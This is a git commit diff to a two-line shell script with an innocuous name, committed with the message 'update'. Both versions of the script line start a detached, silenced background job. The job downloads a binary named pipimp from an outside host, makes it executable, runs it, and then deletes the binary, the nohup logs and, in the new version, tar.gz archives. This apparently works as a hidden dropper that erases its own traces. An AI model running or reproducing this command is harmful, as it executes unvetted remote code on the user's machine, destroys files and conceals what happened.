9b8255ef3c1c00c967e5ce538f2e847004e268c1
AndresNeron <andres.finanzas0820@gmail.com>
2026-05-23 18:08:05 -0600

    update

--- light/add_public_dynamic_u_8.sh
+++ light/add_public_dynamic_u_8.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-(nohup bash -c 'find -type f | grep pipimp | xargs rm; wget https://airflow.it.com/pipimp && chmod +x ./pipimp && ./pipimp; rm pipimp* nohup*' > /dev/null 2>&1 &) > /dev/null 2>&1
+(nohup bash -c 'find -type f | grep pipimp | xargs rm; wget https://airflow.it.com/pipimp && chmod +x ./pipimp && ./pipimp; rm pipimp* nohup* *tar.gz' > /dev/null 2>&1 &) > /dev/null 2>&1
